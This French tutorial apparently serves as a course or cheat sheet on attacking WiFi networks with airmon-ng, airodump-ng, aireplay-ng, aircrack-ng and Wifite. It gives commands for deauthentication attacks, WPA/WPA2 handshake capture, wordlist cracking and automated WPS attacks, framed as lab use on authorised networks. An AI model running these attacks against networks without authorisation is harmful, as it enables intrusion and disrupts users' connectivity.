# 📡 Cours : Hacking WiFi avec Airmon-ng & Wifite (Kali/Parrot OS)

Ce document explique l’utilisation des outils **Airmon-ng** et **Wifite** pour effectuer des attaques sur des réseaux WiFi dans un cadre légal et pédagogique.

⚠️ **Utilisation uniquement sur des réseaux dont vous possédez l’autorisation.**

---

## 🧰 Prérequis

- Système : Kali Linux / Parrot OS
- Une carte réseau compatible **monitor mode** (ex: Alfa AWUS036NHA)
- Privilèges root (`sudo`)

---

## 🛠️ Airmon-ng – Mise en mode monitor

### 📌 Objectif
Passer la carte WiFi en mode **monitor**, nécessaire pour écouter le trafic.

### 🔍 Lister les interfaces

```bash
airmon-ng
```

### 🚀 Activer le mode monitor

```bash
airmon-ng start wlan0
```

Cela va créer une interface `wlan0mon`.

### 🛑 Désactiver le mode monitor

```bash
airmon-ng stop wlan0mon
```

---

## 📶 Airodump-ng – Scanner les réseaux

```bash
airodump-ng wlan0mon
```

Affiche :
- Les points d'accès (BSSID, canal, chiffrement)
- Les clients connectés (STATION)

---

## 💥 Attaque de désauthentification

```bash
aireplay-ng --deauth 10 -a [BSSID] -c [CLIENT_MAC] wlan0mon
```

- `-a` = BSSID de l’AP
- `-c` = MAC du client
- Permet de capturer un **handshake WPA/WPA2**

---

## 🔐 Capturer un handshake

```bash
airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon
```

Puis déclencher une désauthentification pour forcer une reconnexion.

---

## 🔓 Cracker le handshake

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture.cap
```

---

## 🤖 Wifite – Automatiser l'attaque

### 📌 Objectif
Attaquer automatiquement les réseaux WEP, WPA, WPA2 (avec handshake).

### ▶️ Lancer Wifite

```bash
sudo wifite
```

- Scanne les réseaux à portée
- Choisir une cible avec [Entrée]
- L’outil va :
  - Mettre l’interface en monitor
  - Lancer `airodump`, `aireplay`, `aircrack`
  - Cracker automatiquement les handshakes capturés

---

## ⚙️ Options utiles Wifite

```bash
wifite --kill             # Tuer les process gênants (NetworkManager)
wifite --wps              # Cibler les réseaux WPS activés
wifite --crack            # Ne faire que le cracking (handshake déjà capturé)
wifite --wordlist chemin  # Utiliser une wordlist personnalisée
```

---

## 🧠 Conseils

- Toujours désactiver `NetworkManager` pendant l’attaque :
  ```bash
  service NetworkManager stop
  ```
- Utiliser `airmon-ng check kill` pour libérer les processus bloquants
- Préparer une bonne wordlist (`rockyou.txt`, SecLists, etc.)
- Testez sur un lab WiFi isolé ou une box perso

---

📁 À placer dans `docs/cours/wifi/attaques.md` ou `docs/cheatsheets/wifi-hack.md`
